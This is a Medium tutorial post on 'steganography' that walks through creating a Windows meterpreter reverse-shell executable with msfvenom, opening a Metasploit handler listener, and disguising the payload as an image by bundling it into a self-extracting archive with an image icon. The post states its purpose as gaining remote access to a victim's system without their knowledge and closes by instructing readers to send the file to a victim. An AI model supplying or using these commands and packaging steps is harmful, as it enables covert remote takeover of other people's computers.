---
title: "Steganography  Hiding payload behind Image 1defa83a1aa4"
platform: Medium
original_file: 2024-07-14_Steganography--Hiding-payload-behind-Image-1defa83a1aa4.md
---

# Steganography  Hiding payload behind Image 1defa83a1aa4

::: {}
# Steganography: Hiding payload behind Image {#steganography-hiding-payload-behind-image .p-name}
:::

::: {.section .p-summary field="subtitle"}
Steganography: Hiding payload behind the image
:::

::::::: {.section .e-content field="body"}
:::::: {#0077 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Steganography: Hiding payload behind Image {#f200 .graf .graf--h3 .graf--leading .graf--title name="f200"}

<figure id="46e5" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*POd_cmyRrHGgANTJ.jpg"
class="graf-image" data-image-id="0*POd_cmyRrHGgANTJ.jpg"
data-width="640" data-height="334" data-is-featured="true" />
</figure>

### Steganography: Hiding payload behind the image {#e933 .graf .graf--h3 .graf-after--figure name="e933"}

In this article, we'll look at how to hide our payload within an image.
This will allow us to gain remote access to our victim's system without
his knowledge.

**Steganography** is the process of concealing a payload or anything
else behind any media or file.

Steps 1. Let's check our IP address:-

**Ifconfig**

<figure id="d8b6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*FlfPGqNoAVluweuQ.png"
class="graf-image" data-image-id="0*FlfPGqNoAVluweuQ.png"
data-width="788" data-height="341" />
</figure>

Step 2. Create a payload

**msfvenom -p windows/meterpreter/reverse_tcp lhost 192.168.128.128
lport 4444 -f exe \> /home/lucifer/Desktop/test.exe**

Step 3. Open Listener

**msfconsole**

<figure id="9107" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Hm_jRu_q84NeVoYN.png"
class="graf-image" data-image-id="0*Hm_jRu_q84NeVoYN.png"
data-width="788" data-height="406" />
</figure>

Step 4. Set handler

**use exploit/multi/handler**

<figure id="20c4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*krQcW49e7XDDsMaW.png"
class="graf-image" data-image-id="0*krQcW49e7XDDsMaW.png"
data-width="788" data-height="405" />
</figure>

Step 5. Set payload

**set payload windows/meterpreter/reverse_tcp**

<figure id="b4d6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SxBgm7qkkQOmvt1t.png"
class="graf-image" data-image-id="0*SxBgm7qkkQOmvt1t.png"
data-width="788" data-height="405" />
</figure>

Step 6. Set lhost

**set lhost 192.168.128.128**

<figure id="89e0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*QmRWgJqVmf4HQzUg.png"
class="graf-image" data-image-id="0*QmRWgJqVmf4HQzUg.png"
data-width="788" data-height="404" />
</figure>

Step 7. Set lport

**set lport 4444**

<figure id="6dcc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Qr4589F_Y1cC1Oqo.png"
class="graf-image" data-image-id="0*Qr4589F_Y1cC1Oqo.png"
data-width="788" data-height="407" />
</figure>

Step 8. Check for remaining requirements

**show options**

<figure id="86ba" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*LJFHW39nz-J1rtPL.png"
class="graf-image" data-image-id="0*LJFHW39nz-J1rtPL.png"
data-width="788" data-height="407" />
</figure>

Step 9. Let's exploit

**exploit**

<figure id="0ca9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*il7CW2IpdeUXNfpe.png"
class="graf-image" data-image-id="0*il7CW2IpdeUXNfpe.png"
data-width="788" data-height="405" />
</figure>

Now, we will take our payload to the windows environment

Step 10. Let's download a PNG image behind which we are going to hide
our payload

Step 11. Now let's get our icon so open ICOCONVERTER.COM

Step 12. Let's get our icon

<figure id="e5db" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*C57chZ_7RQmJWNVs.png"
class="graf-image" data-image-id="0*C57chZ_7RQmJWNVs.png"
data-width="788" data-height="407" />
</figure>

Step 13. Place your payload, png and icon in one place

Step 14. Now select your payload and Png image together and click on add
to the archive

Step 15. Change the name, Create on SFX archive and choose compression
method to best

Step 16. Click on the Advance option and choose SFX options

Step 17. Click on the Update option and choose extract and update files
in update mode and choose overwrite all files in overwrite mode

<figure id="f61d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*WS3XRxnmumUf_H0Z.png"
class="graf-image" data-image-id="0*WS3XRxnmumUf_H0Z.png"
data-width="788" data-height="401" />
</figure>

Step 18. Now go to the setup option and give your payload name and image
name with extension

<figure id="e2f4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*B4koz9xvkeJ24id3.png"
class="graf-image" data-image-id="0*B4koz9xvkeJ24id3.png"
data-width="788" data-height="397" />
</figure>

Step 19. Now go to the Text and icon option and choose load SFX icon
from the file and upload your icon file

<figure id="8874" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*geb8FtmEErDecp-F.png"
class="graf-image" data-image-id="0*geb8FtmEErDecp-F.png"
data-width="788" data-height="398" />
</figure>

Step 20. Click on OK and OK

Step 21. Your final payload will be created which is in looking like an
image that we choose

<figure id="2513" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*r7iuLRHV2QMF8ndp.png"
class="graf-image" data-image-id="0*r7iuLRHV2QMF8ndp.png"
data-width="785" data-height="862" />
</figure>

Step 22. Send this final image to your victim and you will get your
meterpreter session as soon as your victim will open that image
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [July 14, 2024](https://medium.com/p/1defa83a1aa4).

[Canonical
link](https://medium.com/@bevijaygupta/steganography-hiding-payload-behind-image-1defa83a1aa4){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
